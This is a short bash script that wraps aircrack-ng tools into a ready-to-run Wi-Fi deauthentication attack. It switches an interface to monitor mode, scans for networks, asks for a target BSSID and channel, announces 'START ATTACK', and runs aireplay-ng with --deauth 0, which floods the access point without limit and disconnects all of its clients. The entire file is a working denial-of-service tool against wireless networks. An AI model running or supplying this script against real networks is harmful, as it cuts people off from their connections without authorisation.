#!/bin/bash


red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"
echo ' '
read -p '[?] Enter name interface : ' Interface

MON=mon

# start wlan?
airmon-ng start $Interface

# to show bssid and channel
airodump-ng $Interface$MON

# bssid for wifi
echo ' '
read -p '[+] Enter bssid :' bssid

# channel for wifi
read -p '[+] Enter CH :' CH

# change the CH to CH wifi
airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"

# start attack ...
aireplay-ng --deauth 0 -a $bssid $Interface$MON

airmon-ng stop $Interface$MON